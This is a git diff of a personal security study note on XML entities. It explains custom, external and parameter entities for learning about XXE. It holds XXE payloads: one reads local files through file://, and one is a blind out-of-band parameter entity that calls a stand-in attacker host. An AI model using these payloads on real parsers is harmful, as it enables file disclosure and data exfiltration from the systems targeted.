@@ -99,11 +99,11 @@
   </book>
 </bookstore>
 ```
-### What are XML custom entities?
+## What are XML custom entities?
 
 `<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>` -> any usage of the entity reference `&myentity;` = "`my entity value`"
 
-### What are XML external entities?
+## What are XML external entities?
 
 ex: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>` 
 -> (file protocol in url): `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`
@@ -113,3 +113,15 @@ ex: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
 - it must specify a *URL* from which the *value of the entity should be loaded*
 - this is where [[concepts and defense|XXE]] arises 
 
+## What are XML Parameter entities?
+[source](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#what-are-xml-parameter-entities)
+
+ex: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
+  -> blind XXE using out-of-band detection
+  
+- XML parameter entities are a special kind of XML entity which can <mark style="background: #ADCCFFA6;">only be referenced elsewhere within the DTD</mark>.
+- the **declaration** of an XML parameter entity *includes the percent character before the entity name*
+  -> `<!ENTITY % myparameterentity "my parameter entity value" >`
+- parameter entities are **referenced** using the *percent character instead of the usual ampersand*
+  -> `%myparameterentity;`
+/gitcomm
